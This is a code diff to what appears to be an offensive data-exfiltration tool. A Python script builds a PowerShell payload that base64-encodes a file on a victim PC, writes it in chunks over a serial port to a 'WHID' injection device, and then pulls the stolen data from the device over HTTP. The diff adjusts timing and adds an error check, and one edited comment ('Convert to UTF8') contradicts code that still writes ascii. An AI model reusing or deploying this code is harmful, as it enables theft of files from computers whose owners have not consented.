@@ -51,11 +51,11 @@ to_send += 'echo "" > $env:TEMP\\tmp; echo "" > $env:TEMP\\tmp2; '
 to_send += f'$res = [convert]::ToBase64String((Get-Content -Path "{file}" -Encoding byte)); '
 # Split into 100 byte chunks
 to_send += '$res -Split "(.{100})" | ?{$_} > $env:TEMP\\tmp; echo "!!!END!!!" >> $env:TEMP\\tmp; '
-# Convert to ACSII
+# Convert to UTF8
 to_send += '$chunks = Get-Content $env:TEMP\\tmp; $chunks | Set-Content -Encoding "ascii" $env:TEMP\\tmp; '
 # Send code
 to_send += '$WHIDport.open(); '
-to_send += 'foreach($line in Get-Content $env:TEMP\\tmp){ $WHIDport.WriteLine("SerialEXFIL:$line"); Start-Sleep -Milliseconds 1500; } '
+to_send += 'foreach($line in Get-Content $env:TEMP\\tmp){ $WHIDport.WriteLine("SerialEXFIL:$line"); Start-Sleep -Milliseconds 1750; } '
 to_send += '$WHIDport.Close(); exit;'
 # Send command to PC
 if not resume:
@@ -70,6 +70,9 @@ while "!!!END!!!" not in res:
     try:
         res = requests.get(f"{url}/SerialEXFIL.txt", auth=creds).text
         print(f"Got {len(res)} bytes", end="\r", flush=True)
+        if "SerialEXFIL:" in res:
+            print("ERROR - TIMING ISSUE WHILE EXPORTING")
+            quit()
         time.sleep(delay + int(len(res) / 100000))
     except KeyboardInterrupt:
         quit()
